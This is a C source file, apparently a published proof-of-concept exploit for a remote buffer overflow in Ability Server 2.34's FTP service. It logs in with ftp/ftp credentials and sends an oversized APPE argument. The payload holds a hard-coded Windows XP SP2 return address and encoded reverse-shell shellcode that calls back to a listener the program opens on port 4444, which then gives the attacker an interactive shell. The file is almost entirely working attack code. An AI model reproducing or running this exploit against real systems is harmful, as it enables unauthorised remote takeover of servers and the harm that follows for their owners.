#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#define RET "\x0A\xAF\xD8\x77" /*xp sp2*/
#define PORT 21
#define PORT1 4444
#define BACKLOG 1

// Reverse shell on 192.168.10.94:4444
char shellcode[] =
            "\xd9\xc4\xbf\x6f\x22\xeb\x6c\xd9\x74\x24\xf4\x5a\x31\xc9" 
            "\xb1\x4f\x83\xea\xfc\x31\x7a\x15\x03\x7a\x15\x8d\xd7\x17" 
            "\x84\xd8\x18\xe8\x55\xba\x91\x0d\x64\xe8\xc6\x46\xd5\x3c" 
            "\x8c\x0b\xd6\xb7\xc0\xbf\x6d\xb5\xcc\xb0\xc6\x73\x2b\xfe" 
            "\xd7\xb2\xf3\xac\x14\xd5\x8f\xae\x48\x35\xb1\x60\x9d\x34" 
            "\xf6\x9d\x6e\x64\xaf\xea\xdd\x98\xc4\xaf\xdd\x99\x0a\xa4" 
            "\x5e\xe1\x2f\x7b\x2a\x5b\x31\xac\x83\xd0\x79\x54\xaf\xbe" 
            "\x59\x65\x7c\xdd\xa6\x2c\x09\x15\x5c\xaf\xdb\x64\x9d\x81" 
            "\x23\x2a\xa0\x2d\xae\x33\xe4\x8a\x51\x46\x1e\xe9\xec\x50" 
            "\xe5\x93\x2a\xd5\xf8\x34\xb8\x4d\xd9\xc5\x6d\x0b\xaa\xca" 
            "\xda\x58\xf4\xce\xdd\x8d\x8e\xeb\x56\x30\x41\x7a\x2c\x16" 
            "\x45\x26\xf6\x37\xdc\x82\x59\x48\x3e\x6a\x05\xec\x34\x99" 
            "\x52\x96\x16\xf6\x97\xa4\xa8\x06\xb0\xbf\xdb\x34\x1f\x6b" 
            "\x74\x75\xe8\xb5\x83\x7a\xc3\x01\x1b\x85\xec\x71\x35\x42" 
            "\xb8\x21\x2d\x63\xc1\xaa\xad\x8c\x14\x7c\xfe\x22\xc7\x3c" 
            "\xae\x82\xb7\xd4\xa4\x0c\xe7\xc4\xc6\xc6\x9e\xc3\x51\x29" 
            "\x08\xc1\xff\xc1\x4b\xd5\xee\x4d\xc5\x33\x7a\x7e\x83\xec" 
            "\x13\xe7\x8e\x66\x85\xe8\x04\xee\x26\x7a\xc3\xee\x21\x67" 
            "\x5c\xb9\x66\x59\x95\x2f\x9b\xc0\x0f\x4d\x66\x94\x68\xd5" 
            "\xbd\x65\x76\xd4\x30\xd1\x5c\xc6\x8c\xda\xd8\xb2\x40\x8d" 
            "\xb6\x6c\x27\x67\x79\xc6\xf1\xd4\xd3\x8e\x84\x16\xe4\xc8" 
            "\x88\x72\x92\x34\x38\x2b\xe3\x4b\xf5\xbb\xe3\x34\xeb\x5b" 
            "\x0b\xef\xaf\x7c\xee\x25\xda\x14\xb7\xac\x67\x79\x48\x1b" 
            "\xab\x84\xcb\xa9\x54\x73\xd3\xd8\x51\x3f\x53\x31\x28\x50" 
            "\x36\x35\x9f\x51\x13";


struct sockaddr_in hrm,lar,target;
void shell(int sock)
{
 fd_set fd_read;
 char buff[1024];
 int n;
 
 while(1) {
  FD_SET(sock,&fd_read);
  FD_SET(0,&fd_read);
 
  if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;
 
  if( FD_ISSET(sock, &fd_read) ) {
   n=read(sock,buff,sizeof(buff));
   if (n == 0) {
       printf ("Connection closed.\n");
       exit(EXIT_FAILURE);
   } else if (n < 0) {
       perror("read remote");
       exit(EXIT_FAILURE);
   }
   write(1,buff,n);
  }
 
  if ( FD_ISSET(0, &fd_read) ) {
    if((n=read(0,buff,sizeof(buff)))<=0){
      perror ("read user");
      exit(EXIT_FAILURE);
    }
    write(sock,buff,n);
  }
 }
 close(sock);
}

int conn(char *ip)
{
 int sockfd;
 hrm.sin_family = AF_INET;
 hrm.sin_port = htons(PORT);
 hrm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(hrm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&hrm,sizeof(struct sockaddr))) < 0)
{
 perror("connect");
 exit(0);
}
 printf("[x] Connected to: %s.\n",ip);
 return sockfd;
}

int listener()
{
 int sd;
 lar.sin_family = AF_INET;
 lar.sin_port = htons(PORT1);
 lar.sin_addr.s_addr = INADDR_ANY;
 bzero(&(lar.sin_zero),8);
 sd = socket(AF_INET,SOCK_STREAM,0);
if((bind(sd,(struct sockaddr *)&lar,sizeof(struct sockaddr)))<0)
{
 perror("bind");
 exit(0);
}
 printf("[x] Bind successfull.\n");
if((listen(sd,BACKLOG)) < 0)
{
 perror("listen");
 exit(0);
}
 printf("[x] Listening on port %d.\n",PORT1);
 return sd;
}
int main(int argc, char *argv[])
{
 char *buffer=malloc(1385),*A=malloc(966),*B=malloc(32),*reply=malloc(200);
 int x,l,news,f;
 memset(A,0x41,966);
 strcat(buffer,A);
 memset(B,0x42,32);
 strcat(buffer,RET);
 strcat(buffer,B);
 strcat(buffer,shellcode);
 printf("**Ability Server 2.34 Remote buffer overflow exploit in ftp STOR by NoPh0BiA.**\n");
 printf("[x] Launching listener.\n");
 l = listener();
 x = conn("192.168.11.97");
 sleep(1);
 printf("[x] Sending bad code...");
 write(x,"USER ftp\r\nPASS ftp\r\n",20);
 sleep(3);
 write(x,"APPE ",5);
 write(x,buffer,strlen(buffer));
 write(x,"\r\n\r\n",4);
 sleep(3);
 printf("done.\n");
 printf("[x] Waiting for shell.\n");
 close(x);
while(1)
{
 news = sizeof(struct sockaddr_in);
if((f=accept(l,(struct sockaddr *)&target,&news)) < 0)
 {
  perror("accept");
  continue;
 }
printf("[x] Got connection from %s.\n",inet_ntoa(target.sin_addr));
 if(!fork()){
 printf("[x] 0wn3d!\n\n");
 shell(f);
 close(f);
 exit(0);
}
 close(f);
}
 
}
